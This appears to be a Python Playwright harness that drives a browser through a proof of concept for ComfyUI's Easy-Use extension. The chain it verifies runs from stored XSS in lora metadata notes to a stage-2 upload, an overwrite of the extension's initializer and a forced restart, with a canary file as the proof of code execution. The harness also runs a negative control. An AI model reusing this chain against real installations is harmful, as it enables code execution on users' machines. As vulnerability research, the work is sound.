#!/usr/bin/env python3
"""drive.py -- drive ComfyUI as an ordinary user for the easyuse.notes reproduction.

The victim's whole action: open ComfyUI in a browser, open a workflow that contains an
Easy-Use loader node with the lora they just downloaded, and click "View Lora Info..."
in that node's own right-click menu. The shipped v2 dialog then fetches
/easyuse/metadata/loras/<name> and, when its Civitai by-hash lookup returns 200, renders
the model's easyuse.notes into span{innerHTML}.

Civitai by-hash responder: the harness intercepts exactly the dialog's outbound request
(Playwright route interception) and answers with a minimal published-model JSON, the same
stand-in the campaign's blocker record prescribed ("a civitai by-hash responder"). Nothing
in the page or the product is modified; the product code runs as pinned.

Usage: python drive.py neg | pos | merge
"""
import hashlib
import json
import pathlib
import sys
import time
import urllib.error
import urllib.request

HERE = pathlib.Path(__file__).resolve().parent
ARTIFACTS = HERE / "artifacts"
# the live stack root may be the local copy (live/ComfyUI) or, when the server runs
# in WSL, the same tree through the \\wsl$ UNC path; poc/live_config.json decides.
_cfg = {}
_cfg_path = HERE / "live_config.json"
if _cfg_path.exists():
    _cfg = json.loads(_cfg_path.read_text(encoding="utf-8"))
LIVE = pathlib.Path(_cfg.get("root", str(HERE / "live" / "ComfyUI")))
BASE = _cfg.get("base", "http://127.0.0.1:8188")
EVIDENCE = HERE / "live" / "evidence"
EXT_INIT = LIVE / "custom_nodes" / "ComfyUI-Easy-Use" / "__init__.py"
CANARY = LIVE / "custom_nodes" / "ComfyUI-Easy-Use" / "STAGE2_CANARY.txt"
SERVER_LOG = LIVE / "comfyui_detail.log"
STAGE2_UPLOADED = LIVE / "input" / "mbe2e_stage2.py"
DOM_ATTR = "data-easyuse-notes"
TOKEN = "MBE2E-CANARY-comfy-easyuse-notes-stage2"

CIVITAI_STUB = {
    "id": 1001,
    "modelId": 2002,
    "name": "repro-by-hash-stub",
    "createdAt": "2026-01-01T00:00:00.000Z",
    "updatedAt": "2026-01-02T00:00:00.000Z",
    "status": "Published",
    "baseModel": "SD 1.5",
    "trainedWords": [],
    "stats": {"downloadCount": 0},
    "description": "",
    "model": {"type": "LORA", "name": "repro-model"},
    "images": [],
}

NODE_WAIT_JS = "(() => { const n = (app.graph._nodes || []).find(n => n.type === 'easy comfyLoader'); return n ? true : false; })()"

# candidate graph->page transforms; the driver verifies each by whether the real
# right-click actually opened a context menu carrying the product's menu entry
NODE_POINT_JS = """
(() => {
  const n = app.graph._nodes.find(n => n.type === 'easy comfyLoader');
  const ds = app.canvas.ds;
  const r = app.canvas.canvas.getBoundingClientRect();
  const lw = n.widgets.find(w => w.name === 'lora_name');
  return {
    rect: {left: r.left, top: r.top},
    scale: ds.scale,
    offset: ds.offset,
    hasConvert: typeof ds.convertOffsetToCanvas === 'function',
    gx: n.pos[0] + 180,
    gy: n.pos[1] + 14,
    lora_widget_value: lw ? lw.value : null,
    widget_names: n.widgets.map(w => w.name)
  };
})()
"""

DIAG_JS = """(() => {
  const out = {};
  out.dialog_present = !!document.querySelector('.easyuse-model-info');
  out.notes_detail_present = !!document.querySelector('.easyuse-model-detail-textarea');
  out.milestone_attr = document.documentElement.getAttribute('""" + DOM_ATTR + """');
  out.control_attr = document.documentElement.getAttribute('""" + DOM_ATTR + """-control');
  out.srcdoc_attr = document.documentElement.getAttribute('""" + DOM_ATTR + """-srcdoc');
  const host = document.querySelector('.easyuse-model-detail-textarea') || document.body;
  const imgs = Array.from(host.querySelectorAll('img'));
  out.img_count = imgs.length;
  out.onerror_types = imgs.map(i => typeof i.onerror);
  out.img_natural_width = imgs.map(i => i.naturalWidth);
  out.iframe_count = document.querySelectorAll('iframe').length;
  const d = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
  out.innerHTML_setter_native = d ? /native code/.test(String(d.set)) : null;
  const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
  out.meta_csp = m ? m.content : null;
  out.trusted_default_policy = !!(window.trustedTypes && window.trustedTypes.defaultPolicy);
  return out;
})()"""


def log_text():
    try:
        return SERVER_LOG.read_text("utf-8", "replace")
    except Exception:
        return ""


def banner_count():
    return log_text().count("To see the GUI go to")


def server_up(deadline_s=15):
    t0 = time.time()
    while time.time() - t0 < deadline_s:
        try:
            with urllib.request.urlopen(BASE + "/system_stats", timeout=5) as r:
                if r.status == 200:
                    return True
        except Exception:
            pass
        time.sleep(1)
    return False


def wait_up(deadline_s=600):
    return server_up(deadline_s)


def sha256_of(p):
    return hashlib.sha256(p.read_bytes()).hexdigest()


def artifact_info(phase):
    p = ARTIFACTS / ("evil_notes_%s.safetensors" % phase)
    return {"name": p.name, "sha256": sha256_of(p), "size": p.stat().st_size,
            "path": str(p)}


def run_browser(phase):
    from playwright.sync_api import sync_playwright
    out = {"page_loaded": False, "file_opened": False, "node_present": False,
           "menu_opened_via": None, "menu_clicked": False, "dialog_present": False,
           "milestone_attr": None, "control_fired": False, "srcdoc_fired": False,
           "diagnostics": {}, "screenshots": [], "console_errors": []}
    console = []
    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=False,
                                     args=["--disable-gpu", "--disable-gpu-sandbox"])
        ctx = browser.new_context(viewport={"width": 1440, "height": 900},
                                  device_scale_factor=1)
        page = ctx.new_page()
        page.on("console", lambda m: console.append(m.type + ":" + m.text[:200])
                if m.type == "error" else None)
        page.on("pageerror", lambda e: console.append("pageerror:" + str(e)[:200]))

        def civitai_route(route):
            url = route.request.url
            if "/api/v1/model-versions/by-hash/" in url:
                route.fulfill(status=200, content_type="application/json",
                              body=json.dumps(CIVITAI_STUB))
            else:
                route.abort()
        page.route("**/civitai.com/**", civitai_route)

        try:
            page.goto(BASE + "/", wait_until="domcontentloaded", timeout=120000)
            page.wait_for_function("window.app && window.app.graph", timeout=120000)
            # a first-run user directory opens the template browser over the canvas;
            # dismiss any such overlay the way a user would
            for _ in range(3):
                try:
                    page.keyboard.press("Escape")
                except Exception:
                    pass
                time.sleep(0.6)
            time.sleep(6)
            out["page_loaded"] = True

            page.set_input_files("#comfy-file-input",
                                 str(ARTIFACTS / ("workflow_%s.json" % phase)),
                                 timeout=60000)
            out["file_opened"] = True
            page.wait_for_function(NODE_WAIT_JS, timeout=60000)
            out["node_present"] = True
            time.sleep(2)

            info = page.evaluate(NODE_POINT_JS)
            expected_lora = "evil_notes_%s.safetensors" % phase
            if info.get("lora_widget_value") != expected_lora:
                out["driver_error"] = (
                    "lora_name widget value %r != expected %r (widget layout mismatch)"
                    % (info.get("lora_widget_value"), expected_lora))
                out["widget_names"] = info.get("widget_names")
                return out
            rect = info["rect"]
            scale = info["scale"]
            off = info["offset"]
            gx, gy = info["gx"], info["gy"]
            candidates = []
            if info["hasConvert"]:
                conv = page.evaluate(
                    "(() => { const n = app.graph._nodes.find(n => n.type === 'easy comfyLoader');"
                    " const c = app.canvas.ds.convertOffsetToCanvas([n.pos[0] + 180, n.pos[1] + 14]);"
                    " return c; })()")
                candidates.append(("product-convert", rect["left"] + conv[0],
                                   rect["top"] + conv[1]))
            candidates.append(("minus-offset-times-scale",
                               rect["left"] + (gx - off[0]) * scale,
                               rect["top"] + (gy - off[1]) * scale))
            candidates.append(("plus-offset-times-scale",
                               rect["left"] + (gx + off[0]) * scale,
                               rect["top"] + (gy + off[1]) * scale))

            item = None
            for via, x, y in candidates:
                page.mouse.click(x, y, button="right")
                time.sleep(0.8)
                menu = page.locator(".litecontextmenu")
                if menu.count() == 0:
                    continue
                target = None
                for label in ("Lora \u4fe1\u606f", "View Lora Info"):
                    t = menu.get_by_text(label, exact=False)
                    if t.count():
                        target = t
                        break
                if target is None:
                    page.keyboard.press("Escape")
                    time.sleep(0.3)
                    continue
                out["menu_opened_via"] = via
                target.first.click()
                out["menu_clicked"] = True
                item = True
                break

            if not item:
                out["console_errors"] = console[:20]
                page.screenshot(path=str(EVIDENCE / ("browser_%s_debug.png" % phase)))
                out["screenshots"].append("browser_%s_debug.png" % phase)
                return out

            page.wait_for_selector(".easyuse-model-info", timeout=30000)
            out["dialog_present"] = True

            deadline = 60 if phase == "pos" else 30
            t0 = time.time()
            shot_taken = False
            while time.time() - t0 < deadline:
                attr = None
                try:
                    attr = page.evaluate(
                        "document.documentElement.getAttribute('%s')" % DOM_ATTR)
                    ctrl = page.evaluate(
                        "document.documentElement.getAttribute('%s-control')" % DOM_ATTR)
                except Exception:
                    break
                out["milestone_attr"] = attr
                out["control_fired"] = ctrl == "CONTROL_FIRED"
                ms = [x for x in (attr or "").split("|") if x]
                if not shot_taken and (("COPY_200" in ms) or (phase == "neg" and out["control_fired"])
                                       or ("XSS_RAN" in ms and phase == "pos")):
                    try:
                        out["diagnostics"] = page.evaluate(DIAG_JS)
                    except Exception as e:
                        out["diagnostics"] = {"unavailable": type(e).__name__}
                    try:
                        page.screenshot(path=str(EVIDENCE / ("browser_%s_full.png" % phase)))
                        out["screenshots"].append("browser_%s_full.png" % phase)
                        dlg = page.locator(".easyuse-model-info")
                        if dlg.count():
                            dlg.first.screenshot(
                                path=str(EVIDENCE / ("browser_%s_dialog.png" % phase)))
                            out["screenshots"].append("browser_%s_dialog.png" % phase)
                    except Exception:
                        pass
                    shot_taken = True
                if phase == "pos" and attr and "REBOOTING" in attr:
                    break
                if phase == "neg" and out["control_fired"] and shot_taken:
                    time.sleep(3)
                    break
                time.sleep(0.4)
            try:
                out["srcdoc_attr"] = page.evaluate(
                    "document.documentElement.getAttribute('%s-srcdoc')" % DOM_ATTR)
                out["srcdoc_fired"] = out["srcdoc_attr"] == "SRCDOC_FIRED"
            except Exception:
                pass
        except Exception as e:
            out["console_errors"] = console[:20]
            out["driver_error"] = type(e).__name__ + ":" + str(e)[:300]
        try:
            browser.close()
        except Exception:
            pass
    out["console_errors"] = out.get("console_errors") or console[:20]
    out["control_fired"] = (out.get("diagnostics", {}) or {}).get("control_attr") == "CONTROL_FIRED" \
        or out.get("control_fired")
    return out


def phase(name):
    EVIDENCE.mkdir(parents=True, exist_ok=True)
    up = wait_up()
    art = artifact_info(name)
    init_before = sha256_of(EXT_INIT)
    banners_before = banner_count()

    ui = run_browser(name)

    restarted = False
    if name == "pos":
        # the payload's last act is GET /easyuse/reboot -> os.execv; record the
        # moment the server actually stops answering, then wait for it to come
        # back on its own -- nobody restarts it from outside
        died = False
        t0 = time.time()
        while time.time() - t0 < 90:
            try:
                urllib.request.urlopen(BASE + "/system_stats", timeout=2)
            except Exception:
                died = True
                break
            time.sleep(0.5)
        back = server_up(600)
        if back:
            wait_up(120)
        restarted = died and back
        banner_restart = banner_count() > banners_before
    else:
        banner_restart = False
    t0 = time.time()
    budget = 180 if restarted else 20
    while time.time() - t0 < budget and not CANARY.exists():
        time.sleep(2)

    res = {
        "phase": name,
        "product_reachable": up,
        "artifact": {k: art[k] for k in ("name", "sha256", "size")},
        "ui": ui,
        "product_restarted_itself": restarted,
        "product_log_shows_extra_banner": banner_restart,
        "banner_count_before": banners_before,
        "banner_count_after": banner_count(),
        "custom_node_init_sha256_before": init_before,
        "custom_node_init_sha256_after": sha256_of(EXT_INIT),
        "uploaded_file_present": STAGE2_UPLOADED.exists(),
        "canary": canary(),
    }
    (EVIDENCE / ("phase_%s.json" % name)).write_text(
        json.dumps(res, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    print(json.dumps(res, indent=2, sort_keys=True))
    return 0


def canary():
    if not CANARY.exists():
        return {"present": False, "content": None}
    raw = CANARY.read_bytes()
    return {"present": True, "content": raw.decode("utf-8", "replace").strip(),
            "sha256": hashlib.sha256(raw).hexdigest()}


def merge():
    neg = json.loads((EVIDENCE / "phase_neg.json").read_text())
    pos = json.loads((EVIDENCE / "phase_pos.json").read_text())

    def ms(phase_res):
        return [x for x in ((phase_res["ui"].get("milestone_attr") or "").split("|")) if x]

    pos_ms = ms(pos)
    xss = "XSS_RAN" in pos_ms
    upload = "UPLOAD_200" in pos_ms
    copy = "COPY_200" in pos_ms
    reboot = "REBOOTING" in pos_ms
    wrote = pos["custom_node_init_sha256_after"] != pos["custom_node_init_sha256_before"]
    restarted = bool(pos["product_restarted_itself"]) or bool(pos.get("product_log_shows_extra_banner"))
    fired = pos["canary"]["present"] and pos["canary"]["content"] == TOKEN
    control_pos = bool(pos["ui"].get("control_fired"))
    control_neg = bool(neg["ui"].get("control_fired"))
    neg_clean = (not ms(neg)
                 and not neg["canary"]["present"]
                 and neg["custom_node_init_sha256_after"] == neg["custom_node_init_sha256_before"]
                 and not neg["uploaded_file_present"])

    honest = []
    if not xss and control_pos:
        honest.append("the control handler injected by the SAME note compiled and fired, "
                      "but the payload handler did not: the failure is in the payload, "
                      "not a product defence")
    if xss and not wrote:
        honest.append("script executed in the origin but the initializer was not overwritten")
    if wrote and not restarted:
        honest.append("the initializer was overwritten but no self-restart was observed; "
                      "the import leg rests on the next ordinary restart")
    if restarted and not fired:
        honest.append("the product restarted itself but the stage-2 canary did not land")
    if not control_neg:
        honest.append("the benign phase control handler did not fire, so the negative "
                      "control cannot show the page would have executed an injected handler")
    if not neg_clean:
        honest.append("the negative control was not clean")

    stages = [xss, upload, copy, reboot, wrote, restarted, fired]
    if all(stages) and neg_clean and control_neg:
        verdict, grade = "PASS", "E2_product_e2e"
    elif xss and neg_clean:
        verdict, grade = "XSS_ONLY", "E1_product_partial"
    else:
        verdict, grade = "FAILED", "blocked"

    result = {
        "root_key": "comfy.easy_use_notes_staged_rce",
        "chain_id": "safetensors_metadata_to_dom_to_staged_rce",
        "product": "Comfy-Org/ComfyUI",
        "product_commit": "387f98aa2822f684b8597959a52a467d88cc4806",
        "component": "yolain/ComfyUI-Easy-Use",
        "component_commit": "450b1ce4ce43b2280521c87f5fa388a898fb2ad2",
        "drive_method": "playwright headed chromium, product's own node context menu "
                        "(View Lora Info...), workflow opened via #comfy-file-input",
        "civitai_by_hash": "local responder via playwright route interception "
                           "(the stand-in the campaign blocker prescribed)",
        "negative": neg,
        "positive": pos,
        "milestones_positive": pos_ms,
        "xss_executed_in_origin": xss,
        "uploaded_stage2": upload,
        "initializer_overwritten": wrote,
        "product_restarted_itself": restarted,
        "stage2_executed_on_import": fired,
        "negative_control_clean": neg_clean,
        "control_handler_fired_benign_phase": control_neg,
        "control_handler_fired_attack_phase": control_pos,
        "srcdoc_vector_fired_attack_phase": bool(pos["ui"].get("srcdoc_fired")),
        "verdict": verdict,
        "achieved_grade": grade,
        "honest_boundary": honest,
        "sink_effect": "canary_file" if fired else ("browser_token" if xss else "none"),
    }
    blob = json.dumps(result, indent=2, sort_keys=True, ensure_ascii=False) + "\n"
    (EVIDENCE / "result.json").write_text(blob, encoding="utf-8")
    sys.stdout.write(blob)
    return 0 if verdict == "PASS" else 1


if __name__ == "__main__":
    a = sys.argv[1] if len(sys.argv) > 1 else "merge"
    sys.exit(merge() if a == "merge" else phase(a))
